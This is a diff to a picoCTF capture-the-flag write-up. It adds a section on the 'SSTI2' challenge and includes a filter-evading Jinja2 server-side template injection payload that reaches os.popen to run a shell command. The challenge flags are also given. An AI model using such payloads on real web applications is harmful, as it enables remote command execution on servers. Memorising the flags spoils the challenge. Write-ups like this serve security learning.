@@ -180,7 +180,7 @@
 
 ## SSTI1
 
-**Categories:** SSTI (Server-side Template Injection)
+**Categories:** SSTI (Server-side Template Injection), command injection
 
 ![image](https://github.com/user-attachments/assets/640a6caa-8025-433b-895a-bfdc57221ded)
 
@@ -343,3 +343,22 @@ int(*open(chr(47) + "flag" + chr(46) + "txt"))
 
 **Flag:** picoCTF{D0nt_Use_Unsecure_f@nctionsb95fffac}
 
+## SSTI2
+
+**Categories:** SSTI (Server-side Template Injection), command injection
+
+![image](https://github.com/user-attachments/assets/c658ab96-94e2-4899-8cf6-05859289818f)
+
+**Note:** This is nearly the same as before, but this time it's filtering input.
+
+In the end, this was the payload that worked:
+
+```
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+```
+
+You know the drill from here
+
+![image](https://github.com/user-attachments/assets/b6ab609e-72d6-4e75-8999-b4c27e48954a)
+
+**Flag:** picoCTF{sst1_f1lt3r_byp4ss_5b0b2f79}
